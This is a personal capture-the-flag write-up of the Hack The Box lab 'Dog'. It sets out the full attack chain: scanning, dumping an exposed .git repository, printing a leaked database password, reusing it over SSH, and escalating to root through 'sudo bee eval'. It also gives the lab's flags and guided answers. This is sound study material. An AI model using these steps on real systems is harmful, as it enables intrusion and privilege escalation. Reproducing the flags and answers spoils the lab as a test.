# Dog
- https://www.youtube.com/watch?v=Z24FN8qqngY&t=214s
- https://0xdf.gitlab.io/2025/07/12/htb-dog.html

## Setup
```
┌──(root㉿kali)-[/home/jacob/Documents/Notes/HTB_Labs]
└─# touch HTB_Dog.md; mousepad HTB_Dog.md

┌──(root㉿kali)-[/home/jacob/Desktop]
└─# mkdir dog; cp nmap.sh dog; cd dog

┌──(root㉿kali)-[/home/jacob/Desktop/dog]
└─# ./nmap.sh dog 10.129.231.223

```

## NMAP
```
┌──(root㉿kali)-[/home/jacob/Desktop/dog]
└─# ./nmap.sh dog 10.129.231.223
Running nmap scan on 10.129.231.223 with output to dog...
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 07:26 AEST
Nmap scan report for 10.129.231.223
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git: 
|   10.129.231.223:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 338.70 seconds
Scan completed successfully.
Output files created: dog.nmap, dog.gnmap, dog.xml
```

## Guided Mode Questions
1. How many open TCP ports are listening on Dog?
```
2
```
2. What is the name of the directory on the root of the webserver that leaks the full source code of the application?
```
.git

This was obvious by looking at the NMAP scan results
```
3. What is the CMS used to make the website on Dog? Include a space between two words.
```
backdrop cms

Also obvious in the NMAP scan
```
4. What is the password the application uses to connect to the database?
```
BackDropJ2024DS2024


Used git-dumper in venv: 

┌──(v-env)(root㉿kali)-[/home/jacob/Desktop/dog]
└─# git-dumper http://10.129.231.223:80/.git/ output

Then ran:

┌──(v-env)(root㉿kali)-[/home/jacob/Desktop/dog/output]
└─# find . -type f | grep pass                                                                                                                  
./core/modules/simpletest/tests/password.test
./core/modules/user/tests/user_password_reset.test
./core/modules/user/user.password.inc
./core/scripts/password-hash.sh
./core/includes/password.inc

Didn't work, after trying other keywords I read 0xdf who found it in settings.php

$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';

Literally found in the root directory
```

5. What user uses the DB password to log into the admin functionality of Backdrop CMS?
```
tiffany

In this case it was reasonable to assume they might existr with the @dog.htb format:

──(v-env)(root㉿kali)-[/home/jacob/Desktop/dog/output]
└─# grep -r '@dog.htb'                                                                                                                          
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000       commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000    commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases

```

6. What system user is the Backdrop CMS instance running as on Dog?
```
johncusack

I couldn't get the vulnerability to work as described in 0xdf:

This requires knowing the version number and researching for CVEs.
- https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS
- Go here --> https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/tag/backdrop
- Download reference.tar and manually install it as a module

```
7. What system user on Dog shares the same DB password?
```
johncusack


Learnt by trying out different username/password combinations with SSH
```

8. Submit the flag located in the johncusack user's home directory.
```
cb07421cb751ae1c6563a6028a3c7bb8

Using the above username / DB password, SSH, then see user.txt:

┌──(v-env)(root㉿kali)-[/home/jacob/Desktop/dog/output]
└─# ssh johncusack@10.129.231.223

```

9. What is the full path of the binary that the johncusack user can run as any user on Dog?
```
/usr/local/bin/bee

By simply entering: sudo -l
```

10. bee requires a root directory to run properly. What is the appropriate root directory on Dog? Include the trailing /.
```
/var/www/html/

bee is the comm-and line utility for Backdrop CMS. Running bee prints a help menu with a ton of subcommands
```

11. What is the bee subcommand to run arbitrary PHP code?
```
eval

This is from reading the output of 'bee'
```
12. Submit the flag located in the root user's home directory.
```
johncusack@dog:/var/www/html$ sudo bee eval 'system("id")'
uid=0(root) gid=0(root) groups=0(root)
johncusack@dog:/var/www/html$ sudo bee eval 'system("bash")'
root@dog:/var/www/html# cat root.txt
cat: root.txt: No such file or directory
root@dog:/var/www/html# su -
root@dog:~# cat root.txt
9cba04014eb6df4dfac434d4307d46b5
root@dog:~# 

```

## Notes
- If you have the git repo, you won't need to enumerate directories etc
- A clean up script was running on this so it would vanish frequently